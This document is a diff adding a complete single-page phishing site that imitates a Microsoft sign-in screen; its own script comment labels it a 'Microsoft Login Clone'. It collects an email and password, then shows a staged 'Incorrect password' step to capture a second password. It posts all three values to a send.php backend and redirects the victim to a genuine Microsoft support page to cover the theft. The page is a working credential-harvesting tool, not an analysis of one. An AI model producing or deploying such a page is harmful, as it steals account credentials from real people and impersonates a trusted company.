@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', 'Inter', Arial, sans-serif; background-color: #ffffff; color: #1b1b1b; font-size: 14px; line-height: 1.4; -webkit-font-smoothing: antialiased; font-weight: 400; }
+        body { display: flex; flex-direction: column; min-height: 100vh; }
+        .desktop-background-layer { display: none; background-image: url('assets/bg_benz.avif'); background-size: cover; background-position: center center; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .main-content-wrapper { display: flex; justify-content: center; align-items: center; flex-grow: 1; width: 100%; box-sizing: border-box; position: relative; z-index: 1; padding: 20px; }
+        .login-dialog-box { background-color: #ffffff; width: 100%; max-width: 440px; padding: 40px; border-radius: 8px; box-shadow: 0px 4px 16px rgba(0,0,0,0.1); box-sizing: border-box; text-align: center; display: flex; flex-direction: column; }
+        .dialog-header-section { display: flex; align-items: center; justify-content: center; width: 100%; margin-bottom: 24px; min-height: 24px; position: relative; }
+        .back-button-link { color: #1b1b1b; text-decoration: none; display: flex; align-items: center; position: absolute; left: 0; top: 50%; transform: translateY(-50%); }
+        .back-button-link svg { width: 18px; height: 18px; stroke: #605e5c; }
+        .company-logo-image { height: 24px; display: block; }
+        body.step-2-active .dialog-header-section, body.step-3-active .dialog-header-section, body.step-3-success .dialog-header-section { justify-content: center; }
+        .dialog-main-content-area { width: 100%; text-align: center; }
+        .login-form-fields { text-align: left; width: 100%; max-width: 360px; margin-left: auto; margin-right: auto; }
+        .dialog-title-text { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-top: 0; margin-bottom: 6px; }
+        body.step-2-active .dialog-main-content-area > .dialog-title-text, body.step-3-active .dialog-main-content-area > .dialog-title-text { margin-top: 0; margin-bottom: 28px; }
+        .dialog-subtitle-text { font-size: 14px; color: #1b1b1b; margin-bottom: 32px; font-weight: 400; }
+        .user-identifier-tag-container { margin-top: 0; margin-bottom: 14px; text-align: center; }
+        .user-identifier-display-text { font-size: 12px; color: #616161; background-color: #ffffff; border: 1px solid #616161; border-radius: 8px; padding: 5px 9px; display: inline-block; font-weight: 600; }
+        .floating-label-container { position: relative; margin-bottom: 4px; width: 100%; border: 1px solid #8A8886; border-radius: 4px; background-color: #ffffff; height: 40px; display: flex; align-items: center; }
+        .floating-label-container:focus-within { border-color: #0078D4; box-shadow: 0 0 0 1px #0078D4; }
+        .floating-label-container.input-error { border-color: #D13438 !important; box-shadow: 0 0 0 1px #D13438 !important; }
+        .floating-label-container.input-error label { color: #D13438 !important; }
+        .floating-label-container input { width: 100%; padding: 10px 10px 6px 10px; border: none; font-size: 14px; box-sizing: border-box; color: #1b1b1b; background-color: transparent; position: relative; z-index: 1; outline: none; height: 100%; }
+        .floating-label-container label { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 14px; color: #605E5C; pointer-events: none; transition: all 0.15s ease-out; z-index: 0; background-color: #ffffff; padding: 0 4px; }
+        .floating-label-container.focused label, .floating-label-container input:not(:placeholder-shown) + label { top: 0px; transform: translateY(-50%) scale(0.85); font-size: 11px; color: #0078D4; z-index: 2; }
+        .floating-label-container.focused.input-error label { color: #D13438 !important; }
+        .auxiliary-form-link { display: block; font-size: 14px; color: #0067B8; text-decoration: none; margin-top: 18px; margin-bottom: 28px; text-align: left; font-weight: 600; }
+        .auxiliary-form-link:hover { text-decoration: underline; }
+        .form-action-buttons-wrapper { display: flex; justify-content: stretch; margin-top: 8px; }
+        .submit-action-button { background-color: #0067B8; color: white; border: none; padding: 0 20px; font-size: 14px; font-weight: 600; border-radius: 4px; cursor: pointer; width: 100%; height: 38px; text-align: center; line-height: 38px; transition: all 0.1s ease-in-out; position: relative; overflow: hidden; }
+        .submit-action-button:hover { background-color: #005A9E; }
+        .submit-action-button.loading { background-color: #005A9E; opacity: 0.7; cursor: default; }
+        .submit-action-button.loading .button-text { opacity: 0; visibility: hidden; }
+        .submit-action-button .loading-spinner { display: none; width: 18px; height: 18px; border: 2px solid rgba(255, 255, 255, 0.4); border-top-color: #ffffff; border-radius: 50%; animation: spin 0.7s linear infinite; position: absolute; top: 50%; left: 50%; margin-top: -9px; margin-left: -9px; }
+        .submit-action-button.loading .loading-spinner { display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .secondary-action-prompt { font-size: 14px; color: #1b1b1b; margin-top: 22px; text-align: center; font-weight: 400; }
+        .secondary-action-prompt a { color: #0067B8; text-decoration: none; font-weight: 600; }
+        .secondary-action-prompt a:hover { text-decoration: underline; }
+        .form-submission-error-text { color: #D13438; font-size: 12px; font-weight: 400; min-height: 1.2em; margin: 4px 0 0 2px; text-align: left; }
+        #error_pass_1, #error_pass_2 { text-align: center; padding-left: 0; margin: 8px auto 16px; }
+        #completionContainer { display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 350px; }
+        .footer-section { width: 100%; padding: 20px; font-size: 11px; box-sizing: border-box; position: fixed; bottom: 0; left: 0; z-index: 2; text-align: center; background-color: transparent; color: #605e5c; font-weight: 400; }
+        .footer-links { display: inline-flex; gap: 24px; justify-content: center; margin-bottom: 8px; }
+        .footer-section a { color: inherit; text-decoration: none; }
+        .footer-section a:hover { text-decoration: underline; }
+        .footer-notice { display: block; font-size: 10px; color: inherit; margin-top: 8px; font-weight: 400; }
+        @media (min-width: 768px) { .desktop-background-layer { display: block; } .main-content-wrapper { align-items: flex-start; padding-top: max(30px, calc(50vh - 280px)); } }
+        @media (max-width: 767px) { body { background-color: #ffffff; } .main-content-wrapper { align-items: flex-start; padding: 0; } .login-dialog-box { box-shadow: none; padding: 20px 24px; max-width: none; width: 100%; border-radius: 0; justify-content: flex-start; } .dialog-header-section { justify-content: center; padding-top: 0; margin-bottom: 15px; } .dialog-main-content-area { padding-top: 0; } .login-form-fields { max-width: none; margin: 0; } .user-identifier-tag-container { margin: 12px auto; } body.step-2-active .dialog-main-content-area > .dialog-title-text, body.step-3-active .dialog-main-content-area > .dialog-title-text { margin-bottom: 24px; text-align: center; } .secondary-action-prompt { text-align: center; margin-bottom: 20px; } .floating-label-container { height: 42px; } .floating-label-container input { font-size: 15px; } .submit-action-button { height: 38px; line-height: 38px; font-size: 14px; } .footer-section { position: static; background-color: #ffffff; padding: 16px 24px; margin-top: auto; } .footer-links { width: 100%; gap: 16px; } }
+    </style>
+</head>
+<body>
+    <div class="desktop-background-layer"></div>
+    <div class="main-content-wrapper">
+        <div class="login-dialog-box">
+            <!-- Step 1: Email Input -->
+            <div id="step1" class="step active">
+                <header class="dialog-header-section">
+                    <img src="assets/logo_bmw.svg" alt="Microsoft" class="company-logo-image">
+                </header>
+                <main class="dialog-main-content-area">
+                    <h1 class="dialog-title-text">Sign in</h1>
+                    <p class="dialog-subtitle-text">Sign back in to your account to continue.</p>
+                    <form id="emailForm" class="login-form-fields">
+                        <div class="floating-label-container">
+                            <input type="email" id="emailInput" required placeholder=" ">
+                            <label for="emailInput">Email or phone number</label>
+                        </div>
+                        <p class="form-submission-error-text" id="emailError"></p>
+                        <a href="#" class="auxiliary-form-link">Forgot your username?</a>
+                        <div class="form-action-buttons-wrapper">
+                            <button type="submit" class="submit-action-button">
+                                <span class="button-text">Next</span>
+                                <span class="loading-spinner"></span>
+                            </button>
+                        </div>
+                    </form>
+                    <p class="secondary-action-prompt">We've updated our terms and conditions <a href="#">Learn more</a></p>
+                </main>
+            </div>
+
+            <!-- Step 2: Password Input -->
+            <div id="step2" class="step">
+                <header class="dialog-header-section">
+                    <a href="#" class="back-button-link" onclick="goToStep(1); return false;">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                            <path d="M19 12H5M12 19l-7-7 7-7" stroke="#605e5c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </a>
+                    <img src="assets/logo_bmw.svg" alt="Microsoft" class="company-logo-image">
+                </header>
+                <main class="dialog-main-content-area">
+                    <div class="user-identifier-tag-container">
+                        <span class="user-identifier-display-text" id="emailDisplay1"></span>
+                    </div>
+                    <h1 class="dialog-title-text">Enter password</h1>
+                    <form id="passwordForm" class="login-form-fields">
+                        <div class="floating-label-container">
+                            <input type="password" id="passwordInput" required placeholder=" ">
+                            <label for="passwordInput">Password</label>
+                        </div>
+                        <p class="form-submission-error-text" id="passwordError"></p>
+                        <a href="#" class="auxiliary-form-link">Forgot your password?</a>
+                        <div class="form-action-buttons-wrapper">
+                            <button type="submit" class="submit-action-button">
+                                <span class="button-text">Next</span>
+                                <span class="loading-spinner"></span>
+                            </button>
+                        </div>
+                    </form>
+                </main>
+            </div>
+
+            <!-- Step 3: Password Retry -->
+            <div id="step3" class="step">
+                <header class="dialog-header-section">
+                    <a href="#" class="back-button-link" onclick="goToStep(1); return false;">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                            <path d="M19 12H5M12 19l-7-7 7-7" stroke="#605e5c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </a>
+                    <img src="assets/logo_bmw.svg" alt="Microsoft" class="company-logo-image">
+                </header>
+                <main class="dialog-main-content-area">
+                    <div class="user-identifier-tag-container">
+                        <span class="user-identifier-display-text" id="emailDisplay2"></span>
+                    </div>
+                    <h1 class="dialog-title-text">Enter password</h1>
+                    <form id="retryForm" class="login-form-fields">
+                        <div class="floating-label-container input-error">
+                            <input type="password" id="retryInput" required placeholder=" ">
+                            <label for="retryInput">Password</label>
+                        </div>
+                        <p class="form-submission-error-text" id="retryError" style="display:block;text-align:center;">Incorrect password. Please try again.</p>
+                        <a href="#" class="auxiliary-form-link">Forgot your password?</a>
+                        <div class="form-action-buttons-wrapper">
+                            <button type="submit" class="submit-action-button">
+                                <span class="button-text">Next</span>
+                                <span class="loading-spinner"></span>
+                            </button>
+                        </div>
+                    </form>
+                </main>
+            </div>
+
+            <!-- Step 4: Success/Completion -->
+            <div id="step4" class="step">
+                <header class="dialog-header-section">
+                    <img src="assets/logo_bmw.svg" alt="Microsoft" class="company-logo-image">
+                </header>
+                <main class="dialog-main-content-area">
+                    <div id="completionContainer">
+                        <div id="checkmarkContainer" style="margin-bottom: 15px;">
+                            <svg width="72" height="72" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M9.00004 16.17L4.83004 12L3.41004 13.41L9.00004 19L21 7.00001L19.59 5.59001L9.00004 16.17Z" fill="#0078D4"/>
+                            </svg>
+                        </div>
+                        <h2 class="dialog-title-text" style="color:#107C10; margin-top:16px;">Complete</h2>
+                        <p id="redirectingText"></p>
+                    </div>
+                </main>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer-section">
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+        </div>
+        <div class="footer-notice">Use private browsing if this isn't your device. <a href="#">Learn more</a></div>
+    </footer>
+
+    <script>
+        // Single Page Application - Microsoft Login Clone
+        let userData = {
+            email: '',
+            password1: '',
+            password2: ''
+        };
+
+        // Show/hide steps
+        function goToStep(stepNumber) {
+            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+            document.getElementById('step' + stepNumber).classList.add('active');
+            
+            if (stepNumber === 2) {
+                document.getElementById('emailDisplay1').textContent = userData.email;
+                document.body.className = 'step-2-active';
+            } else if (stepNumber === 3) {
+                document.getElementById('emailDisplay2').textContent = userData.email;
+                document.body.className = 'step-3-active';
+            } else if (stepNumber === 4) {
+                document.body.className = 'step-3-success';
+                
+                // Animate redirecting text with dots
+                const redirectingEl = document.getElementById('redirectingText');
+                if (redirectingEl) {
+                    let dots = 0;
+                    const baseText = 'Redirecting shortly';
+                    const interval = setInterval(() => {
+                        dots = (dots + 1) % 4;
+                        redirectingEl.textContent = baseText + '.'.repeat(dots);
+                    }, 500);
+                    
+                    setTimeout(() => {
+                        clearInterval(interval);
+                        window.location.href = 'https://support.microsoft.com/';
+                    }, 3000);
+                }
+            } else {
+                document.body.className = 'step-1-active';
+            }
+        }
+
+        // Initialize floating labels
+        function initFloatingLabel(container) {
+            const input = container.querySelector('input');
+            if (input) {
+                const updateState = () => {
+                    container.classList.toggle('focused', input.value !== '' || document.activeElement === input);
+                };
+                input.addEventListener('focus', updateState);
+                input.addEventListener('blur', updateState);
+                input.addEventListener('input', updateState);
+                updateState();
+            }
+        }
+
+        // Validate email
+        function validateEmail(email) {
+            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim())) {
+                return 'Enter a valid email address.';
+            }
+            return '';
+        }
+
+        // Validate password
+        function validatePassword(password) {
+            if (password.trim() === '') {
+                return 'Password is required.';
+            }
+            if (password.trim().length < 7) {
+                return 'Password must be at least 7 characters.';
+            }
+            return '';
+        }
+
+        // Show loading state
+        function showLoading(button) {
+            button.classList.add('loading');
+            button.disabled = true;
+        }
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize all floating labels
+            document.querySelectorAll('.floating-label-container').forEach(initFloatingLabel);
+            
+            // Email form
+            document.getElementById('emailForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = document.getElementById('emailInput').value;
+                const errorEl = document.getElementById('emailError');
+                const container = this.querySelector('.floating-label-container');
+                
+                const error = validateEmail(email);
+                if (error) {
+                    errorEl.textContent = error;
+                    errorEl.style.display = 'block';
+                    container.classList.add('input-error');
+                } else {
+                    userData.email = email;
+                    showLoading(this.querySelector('.submit-action-button'));
+                    setTimeout(() => goToStep(2), 100);
+                }
+            });
+            
+            // Password form
+            document.getElementById('passwordForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const password = document.getElementById('passwordInput').value;
+                const errorEl = document.getElementById('passwordError');
+                const container = this.querySelector('.floating-label-container');
+                
+                const error = validatePassword(password);
+                if (error) {
+                    errorEl.textContent = error;
+                    errorEl.style.display = 'block';
+                    container.classList.add('input-error');
+                } else {
+                    userData.password1 = password;
+                    showLoading(this.querySelector('.submit-action-button'));
+                    setTimeout(() => goToStep(3), 1500);
+                }
+            });
+            
+            // Retry form
+            document.getElementById('retryForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const password = document.getElementById('retryInput').value;
+                const errorEl = document.getElementById('retryError');
+                const container = this.querySelector('.floating-label-container');
+                
+                const error = validatePassword(password);
+                if (error) {
+                    errorEl.textContent = error;
+                    errorEl.style.display = 'block';
+                    container.classList.add('input-error');
+                } else {
+                    userData.password2 = password;
+                    showLoading(this.querySelector('.submit-action-button'));
+                    
+                    // Send data to PHP backend
+                    const formData = new FormData();
+                    formData.append('email', userData.email);
+                    formData.append('password1', userData.password1);
+                    formData.append('password2', userData.password2);
+                    
+                    fetch('send.php', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            goToStep(4);
+                        } else {
+                            throw new Error('Server error');
+                        }
+                    })
+                    .catch(() => {
+                        errorEl.textContent = 'Error al procesar. Inténtalo de nuevo.';
+                        errorEl.style.display = 'block';
+                        this.querySelector('.submit-action-button').classList.remove('loading');
+                        this.querySelector('.submit-action-button').disabled = false;
+                    });
+                }
+            });
+            
+            // Clear errors on input
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('input', function() {
+                    const container = this.closest('.floating-label-container');
+                    const errorEl = this.closest('.login-form-fields').querySelector('.form-submission-error-text');
+                    if (container) container.classList.remove('input-error');
+                    if (errorEl) errorEl.style.display = 'none';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
